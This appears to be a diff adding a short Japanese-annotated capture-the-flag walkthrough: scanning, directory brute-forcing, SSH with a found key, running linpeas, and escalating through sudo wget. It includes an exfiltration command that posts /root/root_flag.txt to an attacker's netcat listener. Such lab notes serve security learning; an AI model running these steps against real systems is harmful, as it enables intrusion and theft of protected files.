@@ -1,0 +1,39 @@
+nmap -sV -oN nmap.log 10.48.190.221
+
+ページを見るとソースの確認
+
+<!-- Jessie don't forget to udate the webiste -->
+
+隠しファイルの探索
+gobuster dir -u http:// -w /usr/share/wordlists/dirb/common.txt
+
+
+Linuxのユーザー名は大小文字を区別する。
+ssh -i id_rsa user@X.X.X.X
+
+
+# flagという名前のファイルを幅広く探す
+find / -name "*flag*" 2>/dev/null
+
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+scp -i id_rsa linpeas.sh jessie@10.48.190.221:/tmp
+sh linpeas.sh
+
+
+sudo -l
+
+
+rootしか読めないファイルをroot権限のwgetで外部に送る
+nc -lvnp 4444
+nc:netcat
+-l:listen(接続を待ち受ける)
+-v:verbose(詳細な情報を表示する)
+-n:numeric(ホスト名を解決せずにIPアドレスを使用)
+-p:port(ポート番号を指定)
+kaliが待ち受けている状態で、ターゲットから以下のコマンドを実行することで、kaliにファイルを送信することができます。
+
+sudo wget --post-file=/root/root_flag.txt http://<KaliのIP>:4444
+/root/root_flag.txtは送信したいファイルのパスを指定してください。<KaliのIP>はkaliのIPアドレスに置き換えてください。これにより、ターゲットからkaliにファイルが送信されます。
+
+
